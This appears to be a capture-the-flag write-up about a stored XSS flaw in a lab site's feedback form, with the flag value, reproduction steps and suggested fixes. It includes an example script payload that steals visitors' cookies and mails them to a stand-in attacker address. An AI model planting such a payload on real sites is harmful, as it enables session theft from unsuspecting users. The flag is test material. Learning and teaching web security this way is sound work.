# Stored XSS

## Flag

0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

## Description

It's assumed that it's possible to inject code in the title or the comment field.
The XSS is considered stored since all injected code permanently stays in the feedback page, and is executed at each reload.
This one is a bit particular, because to get the flag we had to put one of those keywords (but not limited to) : a, script, p in one of the two fields.
Usually, to be dangerous, a XSS payload should contain html and/or javascript, but here everything contained inside tags is ignored.

## URL

http://192.168.x.y/?page=feedback

## Steps To Reproduce

Leave a new feedback, using the form on the page.

Put the following:

```
Name:     anything

Message:  a (or script, or p)
```

Then valid the form with the `Sign Guestbook` button

## Why is it dangerous ?

Mild one :
Some lusty hackers may love to inject img tags with skinless bananas, or video tags with some "romantic" content.

Lidl one :
It's also possible to put, with javascript, automatic redirections to this fantastic website : https://www.lidl.ch/fr/p/bakery/petit-pain-au-fromage/p9870
Everyone love Lidl's cheese bread, but it will be difficult to see the feedbacks if everytime I try to enter the page, I get automaticaly sent to the lidl store.

CorentinDuDarknet one :
If I can post a message like this :
```
Message : <script>
function sendMail(content) {
    var link = "mailto:blackhat@haxxor.com"
             + "?cc=myCCaddress@example.com"
             + "&subject=" + escape("Hello, I'm a chicken, here are my credentials :)")
             + "&body=" + escape(JSON.stringify(content))
    ;
    window.location.href = link;
}
window.onload(sendMail(document.cookie))</script>
``` 
I will get by mail the cookies of any user who will access to the feedback page, without even letting them notice anything.

## Possible fixes

- In php, htmlspecialchars()
- Escape html tags, quotes and slashes.
- Limit the charset manually (For exemple, alphanumerical + spaces + some allowed special chars)

## Resources

There is no additional resource for this issue.
